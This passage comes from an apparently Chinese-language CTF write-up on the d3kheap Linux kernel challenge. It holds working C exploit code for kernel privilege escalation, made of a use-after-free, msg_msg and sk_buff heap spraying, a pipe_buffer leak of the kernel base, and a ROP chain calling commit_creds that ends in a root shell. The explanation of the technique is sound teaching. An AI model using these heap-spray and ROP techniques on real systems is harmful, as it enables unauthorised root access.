pass</span></span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = kernel_heap_search;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// while the kmem_cache-&gt;offset is not 0, we can easily repair the header of msg_msg</span></span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[kmsg_idx], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR); <span class="comment">// add a obj to pass detection in set_freepointer() in free_msg</span></span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR); <span class="comment">// constructing A-&gt;B-&gt;A</span></span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// regain UAF</span></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    pipe_fd_1 = pipe_fd[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;B&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    buf[<span class="number">2</span>] = fake_ops_addr;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0xffffffff812dbede</span> + kernel_offset; <span class="comment">// push rsi ; pop rsp ; pop 4 val ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// construct ROP</span></span><br><span class="line">    rop_idx = <span class="number">4</span>;</span><br><span class="line">    buf[rop_idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">0x16</span> + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = *(<span class="type">size_t</span>*)<span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[rop_idx++] = *(<span class="type">size_t</span>*)<span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[rop_idx++] = getRootShell;</span><br><span class="line">    buf[rop_idx++] = user_cs;</span><br><span class="line">    buf[rop_idx++] = user_rflags;</span><br><span class="line">    buf[rop_idx++] = user_sp;</span><br><span class="line">    buf[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake ops: %p, gadget: %p\n&quot;</span>, buf[<span class="number">2</span>], buf[<span class="number">1</span>]);</span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    sleep(5);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger</span></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[?] YOU FAILED? zen me hui shi ne?&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不一定每次都能成功（由于开了 freelist 随机化的缘故，我们并不能保证进行 UAF 的 object 往高地址一定会有 msg_msg 结构体），但是经笔者实测成功率还是不低的</p><p><img src="https://s2.loli.net/2022/02/25/SXBzMHaNqKLmPTG.png" alt="image.png"></p><h2 id="解法二：msg-msg-sk-buff-堆喷"><a href="#解法二：msg-msg-sk-buff-堆喷" class="headerlink" title="解法二：msg_msg + sk_buff 堆喷"></a>解法二：msg_msg + sk_buff 堆喷</h2><h3 id="Step-I-堆喷-msg-msg-，建立主从消息队列"><a href="#Step-I-堆喷-msg-msg-，建立主从消息队列" class="headerlink" title="Step.I 堆喷 msg_msg ，建立主从消息队列"></a>Step.I 堆喷 <code>msg_msg</code> ，建立主从消息队列</h3><p>既然我们现在有了一个UAF的机会，那么选用什么样的结构体作为 victim 呢？这里我们选择使用 <code>msg_msg</code> 这一结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们在一个消息队列上发送多个消息时，会形成如下结构：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难想到的是，我们可以在一开始时先通过 d3kheap 设备提供的功能先获取一个 object 后释放，之后堆喷多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局，这里为了便利后续利用，第一条消息（主消息）的大小为 96，第二条消息（辅助消息）的大小为 0x400：</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>此时<strong>我们的辅助消息便有极大的概率获取到之前释放的 object</strong></p><blockquote><p>利用 <code>MSG_COPY</code> 标志位可以读取消息队列上的消息而不释放，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-II-构造-UAF，堆喷-sk-buff-定位-victim-队列"><a href="#Step-II-构造-UAF，堆喷-sk-buff-定位-victim-队列" class="headerlink" title="Step.II 构造 UAF，堆喷 sk_buff 定位 victim 队列"></a>Step.II 构造 UAF，堆喷 <code>sk_buff</code> 定位 victim 队列</h3><p>此时我们直接利用题目的功能将辅助消息释放掉，便能成功完成 UAF 的构建，此时<strong>我们仍能通过其中一个消息队列访问到该辅助消息对应 object，但实际上这个 object 已经在 freelist 上了</strong></p><p><img src="https://s2.loli.net/2022/05/17/sCflaOFvMSzhGUV.png" alt="image.png"></p><p>但此时我们无法得知是哪一个消息队列命中了 UAF object，这个时候我们选用 <code>sk_buff</code> 堆喷劫持该结构体</p><p>类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 <code>msg_msg</code> 由一个 header 加上用户数据组成，而 <code>sk_buff</code> 本身不包含任何用户数据，<strong>用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>至于这个结构体的分配与释放也是十分简单，<strong>sk_buff 在内核网络协议栈中代表一个「包」，</strong>我们不难想到的是<strong>我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放</strong>，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作</p><p>那么我们利用 <code>sk_buff</code> 堆喷向这个 UAF object 中写入什么数据呢？其实这里我们可以随便写入一些内容，之后我们使用 <code>MSG_COPY</code> flag 进行消息拷贝时便会失败，但不会 kernel panic，<strong>因此我们可以通过判断是否读取消息失败来定位命中 UAF 的消息队列</strong></p><h3 id="Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址"><a href="#Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址" class="headerlink" title="Step.III 堆喷 sk_buff 伪造辅助消息，泄露 UAF obj 地址"></a>Step.III 堆喷 <code>sk_buff</code> 伪造辅助消息，泄露 UAF obj 地址</h3><p>接下来我们考虑如何继续利用这个 UAF，由于其位于消息队列上，所以我们可以利用消息队列的性质来完成利用</p><p>首先我们考虑如何通过伪造 <code>msg_msg</code> 结构体完成信息泄露，我们不难想到的是可以伪造一个 <code>msg_msg</code> 结构体，将其 <code>m_ts</code> 域设为一个较大值，<strong>从而越界读取到相邻辅助消息的 header，泄露出堆上地址</strong></p><p>我们泄露出来的是哪个地址？让我们重新将目光放回到消息队列的结构上：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难知道的是，该辅助消息的 prev 指针指向其主消息，而该辅助消息的 next 指针指向该消息队列的 <code>msg_queue</code> 结构，这是目前我们已知的两个“堆上地址”</p><p>接下来我们伪造 <code>msg_msg-&gt;next</code>，<strong>将其指向我们的 UAF object 相邻的辅助消息对应的主消息头部往前，从而读出该主消息的头部，泄露出对应的辅助消息的地址</strong>，有了这个辅助消息的地址，再减去 0x400 <strong>便是我们的 UAF 对象的地址</strong></p><blockquote><p>通过伪造 msg_msg-&gt;next 可以完成任意地址读，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-IV-堆喷-pipe-buffer，泄露内核基址"><a href="#Step-IV-堆喷-pipe-buffer，泄露内核基址" class="headerlink" title="Step.IV 堆喷 pipe_buffer，泄露内核基址"></a>Step.IV 堆喷 <code>pipe_buffer</code>，泄露内核基址</h3><p>现在我们已知了可控区域的地址，接下来让我们来考虑泄露内核 .text 段的基址，以及如何劫持 RIP 完成提权</p><p>之前我们为什么将辅助消息的大小设为 0x400？除了方便对齐以外，还有一层考虑就是这个大小刚好有一个十分实用的结构体 <code>pipe_buffer</code> 数组，<strong>既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP</strong></p><p>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址，操作如下：</p><ul><li>利用 <code>sk_buff</code> 修复辅助消息，之后从消息队列中接收该辅助消息，此时该 object 重回 slub 中，但 <code>sk_buff</code> 仍指向该 object</li><li>喷射 <code>pipe_buffer</code>，之后再接收 <code>sk_buff</code> 数据包，<strong>我们便能读出 pipe_buffer 上数据，泄露内核基址</strong></li></ul><h3 id="Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权"><a href="#Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权" class="headerlink" title="Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权"></a>Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</h3><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，而 UAF object 的地址对我们而言是已知的，因此<strong>我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权</strong></p><p><img src="https://s2.loli.net/2022/05/17/MjuSNf7tmw64hTn.png" alt="image.png"></p><h3 id="Final-EXPLOIT"><a href="#Final-EXPLOIT" class="headerlink" title="Final EXPLOIT"></a>Final EXPLOIT</h3><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_ADD     0x1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_EDIT    0x4321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_SHOW 0xbeef</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_DEL     0xdead</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82c6d580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff8203fe40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FREE_PIPE_INFO 